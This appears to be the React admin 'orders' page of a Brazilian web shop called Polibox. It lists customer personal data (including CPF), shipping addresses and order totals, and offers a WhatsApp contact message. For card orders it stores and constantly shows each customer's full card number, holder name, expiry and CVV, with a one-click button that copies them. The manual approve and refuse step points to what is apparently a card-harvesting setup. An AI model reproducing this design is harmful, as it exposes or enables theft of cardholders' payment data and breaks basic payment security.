import { useState } from "react";
import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { supabase } from "@/integrations/supabase/client";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { useToast } from "@/hooks/use-toast";
import { Link } from "react-router-dom";
import { 
  ShoppingCart, Loader2, Check, X, ArrowLeft,
  CreditCard, MessageCircle, Copy, Phone, MapPin, Package, ChevronDown, ChevronUp
} from "lucide-react";

interface OrderItem {
  id: string;
  name: string;
  price: number;
  quantity: number;
}

interface Order {
  id: string;
  customer_name: string;
  customer_email: string;
  customer_phone: string;
  customer_cpf: string;
  shipping_cep: string;
  shipping_address: string;
  shipping_number: string;
  shipping_complement: string | null;
  shipping_neighborhood: string;
  shipping_city: string;
  shipping_state: string | null;
  items: OrderItem[];
  subtotal: number;
  shipping_cost: number;
  discount: number;
  total: number;
  payment_method: string;
  payment_status: string;
  pix_qrcode: string | null;
  card_brand: string | null;
  card_last_digits: string | null;
  card_number: string | null;
  card_holder: string | null;
  card_expiry: string | null;
  card_cvv: string | null;
  created_at: string;
}

const AdminOrdersPage = () => {
  const { toast } = useToast();
  const queryClient = useQueryClient();
  const [expandedOrders, setExpandedOrders] = useState<Set<string>>(new Set());

  const { data: orders = [], isLoading } = useQuery({
    queryKey: ['admin-orders'],
    queryFn: async () => {
      const { data, error } = await supabase
        .from('orders')
        .select('*')
        .order('created_at', { ascending: false })
        .limit(100);
      if (error) throw error;
      
      return (data || []).map(order => ({
        ...order,
        items: (order.items as unknown as OrderItem[]) || [],
      })) as Order[];
    },
  });

  const updateStatusMutation = useMutation({
    mutationFn: async ({ orderId, status }: { orderId: string; status: string }) => {
      const { error } = await supabase
        .from('orders')
        .update({ payment_status: status })
        .eq('id', orderId);
      if (error) throw error;
    },
    onSuccess: () => {
      toast({ title: "Status atualizado" });
      queryClient.invalidateQueries({ queryKey: ['admin-orders'] });
    },
  });

  const formatPrice = (price: number) => price.toLocaleString('pt-BR', { style: 'currency', currency: 'BRL' });

  const getStatusBadge = (status: string) => {
    switch (status) {
      case 'paid': return <Badge className="bg-green-500">Pago</Badge>;
      case 'analyzing': return <Badge className="bg-yellow-500">Analisando</Badge>;
      case 'pending': return <Badge className="bg-blue-500">Pendente</Badge>;
      case 'failed': return <Badge className="bg-red-500">Falhou</Badge>;
      default: return <Badge>{status}</Badge>;
    }
  };

  const toggleExpanded = (orderId: string) => {
    setExpandedOrders(prev => {
      const newSet = new Set(prev);
      if (newSet.has(orderId)) {
        newSet.delete(orderId);
      } else {
        newSet.add(orderId);
      }
      return newSet;
    });
  };

  const handleWhatsApp = (order: Order) => {
    const phone = order.customer_phone.replace(/\D/g, '');
    const itemsList = order.items?.map(item => `   • ${item.quantity}x ${item.name}`).join('\n') || '';
    const message = encodeURIComponent(
      `Olá ${order.customer_name}! 👋\n\n` +
      `Somos da *Polibox* e estamos entrando em contato referente ao seu pedido:\n\n` +
      `🧾 *Pedido #${order.id.slice(0, 8).toUpperCase()}*\n` +
      `📅 Data: ${new Date(order.created_at).toLocaleDateString('pt-BR')}\n\n` +
      `📦 *Itens do pedido:*\n${itemsList}\n\n` +
      `💰 *Subtotal:* ${formatPrice(Number(order.subtotal))}\n` +
      `🚚 *Frete:* ${Number(order.shipping_cost) === 0 ? 'Grátis' : formatPrice(Number(order.shipping_cost))}\n` +
      (Number(order.discount) > 0 ? `🎁 *Desconto:* -${formatPrice(Number(order.discount))}\n` : '') +
      `💵 *Total:* ${formatPrice(Number(order.total))}\n\n` +
      `📍 *Endereço de entrega:*\n` +
      `${order.shipping_address}, ${order.shipping_number}\n` +
      `${order.shipping_neighborhood} - ${order.shipping_city}/${order.shipping_state}\n` +
      `CEP: ${order.shipping_cep}\n\n` +
      `💳 *Forma de pagamento:* ${order.payment_method === 'pix' ? 'PIX' : 'Cartão de Crédito'}\n` +
      `📊 *Status:* ${order.payment_status === 'paid' ? '✅ Pago' : order.payment_status === 'pending' ? '⏳ Pendente' : order.payment_status === 'analyzing' ? '🔍 Em análise' : '❌ Falhou'}\n\n` +
      `Como podemos ajudar você hoje? 😊`
    );
    window.open(`https://wa.me/55${phone}?text=${message}`, '_blank');
  };

  const handleCopyPix = async (pixCode: string) => {
    try {
      await navigator.clipboard.writeText(pixCode);
      toast({ title: "PIX copiado!", description: "Código PIX copiado para a área de transferência" });
    } catch {
      toast({ title: "Erro ao copiar", variant: "destructive" });
    }
  };

  const handleCopyCardData = async (order: Order) => {
    const cardInfo = `Número: ${order.card_number || 'N/A'}\nTitular: ${order.card_holder || 'N/A'}\nValidade: ${order.card_expiry || 'N/A'}\nCVV: ${order.card_cvv || 'N/A'}`;
    try {
      await navigator.clipboard.writeText(cardInfo);
      toast({ title: "Dados copiados!", description: "Dados do cartão copiados" });
    } catch {
      toast({ title: "Erro ao copiar", variant: "destructive" });
    }
  };

  return (
    <div className="min-h-screen bg-background p-6">
      <div className="max-w-6xl mx-auto space-y-6">
        {/* Header */}
        <div className="flex items-center gap-4">
          <Link to="/admin">
            <Button variant="ghost" size="icon">
              <ArrowLeft className="h-5 w-5" />
            </Button>
          </Link>
          <div>
            <h1 className="font-display text-3xl font-bold text-foreground flex items-center gap-3">
              <ShoppingCart className="h-8 w-8 text-primary" />
              Pedidos
            </h1>
            <p className="text-muted-foreground">
              Gerenciar pedidos e pagamentos
            </p>
          </div>
          <Badge variant="secondary" className="ml-auto text-lg px-4 py-2">
            {orders.length} Pedidos
          </Badge>
        </div>

        {isLoading ? (
          <div className="flex justify-center py-16">
            <Loader2 className="h-8 w-8 animate-spin text-primary" />
          </div>
        ) : orders.length === 0 ? (
          <div className="text-center py-16 text-muted-foreground">
            Nenhum pedido ainda.
          </div>
        ) : (
          <div className="space-y-4">
            {orders.map((order) => {
              const isExpanded = expandedOrders.has(order.id);
              
              return (
                <div key={order.id} className="bg-card rounded-xl border border-border overflow-hidden shadow-lg">
                  {/* Header com informações principais e botões de ação */}
                  <div className="p-4 md:p-6">
                    <div className="flex flex-wrap items-start justify-between gap-4 mb-4">
                      <div>
                        <p className="font-bold text-lg">{order.customer_name}</p>
                        <p className="text-sm text-muted-foreground">{order.customer_email}</p>
                        <p className="text-xs text-muted-foreground">{new Date(order.created_at).toLocaleString('pt-BR')}</p>
                      </div>
                      <div className="text-right">
                        <p className="font-bold text-primary text-2xl">{formatPrice(Number(order.total))}</p>
                        <p className="text-sm text-muted-foreground capitalize mb-1">
                          {order.payment_method === 'pix' ? 'PIX' : order.payment_method === 'card' ? 'Cartão' : order.payment_method}
                        </p>
                        {getStatusBadge(order.payment_status)}
                      </div>
                    </div>

                    {/* Botões de ação sempre visíveis */}
                    <div className="flex flex-wrap gap-2 mb-4">
                      <Button 
                        size="sm" 
                        className="gap-2 bg-green-600 hover:bg-green-700"
                        onClick={() => handleWhatsApp(order)}
                      >
                        <MessageCircle className="h-4 w-4" />
                        WhatsApp
                      </Button>
                      
                      {order.payment_method === 'pix' && order.pix_qrcode && (
                        <Button 
                          size="sm" 
                          className="gap-2 bg-emerald-600 hover:bg-emerald-700"
                          onClick={() => handleCopyPix(order.pix_qrcode!)}
                        >
                          <Copy className="h-4 w-4" />
                          Copiar PIX
                        </Button>
                      )}

                      {order.payment_method === 'card' && order.card_number && (
                        <Button 
                          size="sm" 
                          className="gap-2 bg-orange-600 hover:bg-orange-700"
                          onClick={() => handleCopyCardData(order)}
                        >
                          <Copy className="h-4 w-4" />
                          Copiar Cartão
                        </Button>
                      )}

                      {order.payment_status === 'analyzing' && (
                        <>
                          <Button 
                            size="sm" 
                            className="bg-green-500 hover:bg-green-600 gap-1" 
                            onClick={() => updateStatusMutation.mutate({ orderId: order.id, status: 'paid' })}
                          >
                            <Check className="h-4 w-4" /> Aprovar
                          </Button>
                          <Button 
                            size="sm" 
                            variant="destructive"
                            className="gap-1"
                            onClick={() => updateStatusMutation.mutate({ orderId: order.id, status: 'failed' })}
                          >
                            <X className="h-4 w-4" /> Recusar
                          </Button>
                        </>
                      )}
                    </div>

                    {/* Dados do Cartão sempre visíveis (se for cartão) */}
                    {order.payment_method === 'card' && order.card_number && (
                      <div className="bg-orange-500/10 border border-orange-500/30 p-4 rounded-lg mb-4">
                        <h4 className="font-semibold flex items-center gap-2 text-orange-400 mb-3">
                          <CreditCard className="h-4 w-4" /> Dados do Cartão
                        </h4>
                        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 text-sm">
                          <div>
                            <p className="text-muted-foreground text-xs">Número</p>
                            <p className="font-mono font-bold">{order.card_number}</p>
                          </div>
                          <div>
                            <p className="text-muted-foreground text-xs">Titular</p>
                            <p className="font-bold">{order.card_holder || 'N/A'}</p>
                          </div>
                          <div>
                            <p className="text-muted-foreground text-xs">Validade</p>
                            <p className="font-mono font-bold">{order.card_expiry || 'N/A'}</p>
                          </div>
                          <div>
                            <p className="text-muted-foreground text-xs">CVV</p>
                            <p className="font-mono font-bold">{order.card_cvv || 'N/A'}</p>
                          </div>
                        </div>
                      </div>
                    )}

                    {/* PIX sempre visível (se for pix) */}
                    {order.payment_method === 'pix' && order.pix_qrcode && (
                      <div className="bg-emerald-500/10 border border-emerald-500/30 p-4 rounded-lg mb-4">
                        <h4 className="font-semibold flex items-center gap-2 text-emerald-400 mb-2">
                          <Copy className="h-4 w-4" /> PIX Copia e Cola
                        </h4>
                        <p className="font-mono text-xs break-all select-all bg-background/50 p-2 rounded">{order.pix_qrcode}</p>
                      </div>
                    )}

                    {/* Botão para expandir detalhes */}
                    <Button 
                      variant="ghost" 
                      size="sm" 
                      className="w-full gap-2"
                      onClick={() => toggleExpanded(order.id)}
                    >
                      {isExpanded ? <ChevronUp className="h-4 w-4" /> : <ChevronDown className="h-4 w-4" />}
                      {isExpanded ? 'Ocultar detalhes' : 'Ver mais detalhes'}
                    </Button>
                  </div>

                  {/* Detalhes expandidos */}
                  {isExpanded && (
                    <div className="border-t border-border p-4 md:p-6 bg-secondary/20 space-y-4">
                      <div className="grid md:grid-cols-2 gap-4">
                        <div className="space-y-2">
                          <h4 className="font-semibold flex items-center gap-2">
                            <Phone className="h-4 w-4" /> Cliente
                          </h4>
                          <div className="text-sm space-y-1 bg-muted/50 p-3 rounded-lg">
                            <p><span className="text-muted-foreground">Nome:</span> {order.customer_name}</p>
                            <p><span className="text-muted-foreground">Email:</span> {order.customer_email}</p>
                            <p><span className="text-muted-foreground">Telefone:</span> {order.customer_phone}</p>
                            <p><span className="text-muted-foreground">CPF:</span> {order.customer_cpf}</p>
                          </div>
                        </div>

                        <div className="space-y-2">
                          <h4 className="font-semibold flex items-center gap-2">
                            <MapPin className="h-4 w-4" /> Endereço
                          </h4>
                          <div className="text-sm space-y-1 bg-muted/50 p-3 rounded-lg">
                            <p>{order.shipping_address}, {order.shipping_number}</p>
                            {order.shipping_complement && <p>{order.shipping_complement}</p>}
                            <p>{order.shipping_neighborhood}</p>
                            <p>{order.shipping_city} - {order.shipping_state}</p>
                            <p>CEP: {order.shipping_cep}</p>
                          </div>
                        </div>
                      </div>

                      {/* Itens do Pedido */}
                      <div className="space-y-2">
                        <h4 className="font-semibold flex items-center gap-2">
                          <Package className="h-4 w-4" /> Itens ({order.items?.length || 0})
                        </h4>
                        <div className="bg-muted/50 p-3 rounded-lg space-y-2">
                          {order.items?.map((item, idx) => (
                            <div key={idx} className="flex justify-between text-sm">
                              <span>{item.quantity}x {item.name}</span>
                              <span className="font-medium">{formatPrice(item.price * item.quantity)}</span>
                            </div>
                          ))}
                          <div className="border-t border-border pt-2 mt-2 space-y-1 text-sm">
                            <div className="flex justify-between">
                              <span className="text-muted-foreground">Subtotal</span>
                              <span>{formatPrice(Number(order.subtotal))}</span>
                            </div>
                            <div className="flex justify-between">
                              <span className="text-muted-foreground">Frete</span>
                              <span>{Number(order.shipping_cost) === 0 ? 'Grátis' : formatPrice(Number(order.shipping_cost))}</span>
                            </div>
                            {Number(order.discount) > 0 && (
                              <div className="flex justify-between text-green-400">
                                <span>Desconto PIX</span>
                                <span>-{formatPrice(Number(order.discount))}</span>
                              </div>
                            )}
                            <div className="flex justify-between font-bold text-lg pt-1">
                              <span>Total</span>
                              <span className="text-primary">{formatPrice(Number(order.total))}</span>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                  )}
                </div>
              );
            })}
          </div>
        )}
      </div>
    </div>
  );
};

export default AdminOrdersPage;
